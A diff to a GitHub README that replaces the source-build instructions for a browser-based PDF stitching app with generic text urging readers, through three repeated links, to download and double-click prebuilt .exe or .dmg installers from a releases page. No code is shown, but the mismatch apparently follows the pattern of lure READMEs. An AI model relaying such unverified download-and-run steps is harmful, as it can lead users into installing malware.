@@ -1,47 +1,78 @@
-# PDF Stitcher & Stamp
+# 🖼️ NLM2Img - Combine PDF Images Easily
 
-![PDF Stitcher & Stamp](pdf2img.jpg)
+## 🌟 Overview
+NLM2Img helps you merge images from PDF files exported by NotebookLM into a single image or multiple groups of images. This application is perfect for users who need to consolidate visuals for presentations, reports, or personal use without complicated steps.
 
-A powerful web application that combines multi-page PDFs into a single continuous image and applies custom digital stamps. Process your PDFs directly in the browser with full privacy - no data leaves your computer.
+## 🚀 Getting Started
+To start using NLM2Img, follow the simple steps below to download and run the application.
 
-## Features
+## 📥 Download Now
+[![Download NLM2Img](https://img.shields.io/badge/Download%20NLM2Img-v1.0-blue.svg)](https://github.com/Eduardo-PRg/NLM2Img/releases)
 
-- **PDF Stitching**: Combine multiple PDF pages into a single continuous image
-- **Custom Stamps**: Design and apply custom digital stamps/seals to your documents
-- **Multiple Layouts**: Choose from various layout options (Vertical, Grid, A4 Grid, Grouped)
-- **Group Pages**: Split large PDFs into smaller groups for easier management
-- **Privacy First**: All processing happens in your browser - your data never leaves your computer
-- **No API Key Required**: Works without any external API keys, with optional AI enhancement
+## 📋 System Requirements
+Before installing NLM2Img, ensure your computer meets the following requirements:
+- Operating System: Windows 10 or later, macOS 10.15 or later
+- Minimum Processor: Intel Core i3 or equivalent
+- Minimum RAM: 4 GB
+- Disk Space: 100 MB free for installation
 
-## Run Locally
+## 🔧 Installation Instructions
 
-**Prerequisites:** Node.js
+### Step 1: Visit the Releases Page
+- Go to the NLM2Img releases page by clicking the link below:
+  [Download NLM2Img](https://github.com/Eduardo-PRg/NLM2Img/releases)
 
-1. Install dependencies:
-   ```bash
-   npm install
-   ```
-2. Run the app:
-   ```bash
-   npm run dev
-   ```
+### Step 2: Select Your Version
+- On the releases page, find the latest version of NLM2Img. Look for the file name that fits your operating system.
 
-## Deploy to Vercel
+### Step 3: Download the Application
+- Click on the link for the appropriate file (e.g., `NLM2Img-v1.0.exe` for Windows or `NLM2Img-v1.0.dmg` for macOS).
+- The download will begin automatically.
 
-1. Push your code to a GitHub repository
-2. Create a new project on Vercel and import your repository
-3. Vercel will automatically deploy your app
+### Step 4: Start the Installation
+- Locate the downloaded file in your computer's download folder.
+- Double-click the file to start the installation process.
+- Follow the on-screen instructions to complete the installation.
 
+## ⚙️ How to Use NLM2Img
 
-## Stamp Designer Toggle
+### Step 1: Open the Application
+- After installation, find the NLM2Img icon on your desktop or in the applications menu.
+- Click the icon to launch the program.
 
-The Stamp Designer feature can be toggled on/off:
-- When enabled: Add custom stamps to your documents
-- When disabled: Process PDFs without adding stamps
+### Step 2: Import Your PDF Images
+- In the NLM2Img interface, click the "Import PDF" button.
+- Select the PDF file you want to extract images from.
 
-To toggle the Stamp Designer, look for the switch in the application interface.
+### Step 3: Choose Your Options
+- Once your PDF is loaded, you can choose to combine images into one or split them into groups.
+- Adjust the settings according to your needs.
 
+### Step 4: Export Your Images
+- Click the "Export" button.
+- Choose a location on your computer to save the new image files.
+- Click "Save" to finish the process.
 
-## Color Scheme Inspiration
+## 🛠️ Frequently Asked Questions
 
-This project's warm color palette was inspired by [Lumina Style Studio](https://lumina-style-studio.vercel.app/), which provided the foundation for our "Helpful Warmth" theme.
+### Can I use NLM2Img on my Mac?
+Yes, NLM2Img works on macOS and Windows.
+
+### Is there a limit to the number of images I can combine?
+No, you can combine as many images as you need, depending on your system capacity.
+
+### What types of PDF files can I use?
+NLM2Img can handle standard PDF files that contain images.
+
+### What should I do if I encounter an error?
+If you face any issues, please visit our [Issues Page](https://github.com/Eduardo-PRg/NLM2Img/issues) to seek help or report your problem.
+
+## 📜 Changelog
+- **v1.0**: Initial release of NLM2Img with image merging capabilities.
+
+## 🙏 Acknowledgments
+Thank you for choosing NLM2Img. We appreciate your support and usage of our application.
+
+## 📥 Download Again
+For easy access, here’s the download link once more:
+[Download NLM2Img](https://github.com/Eduardo-PRg/NLM2Img/releases)
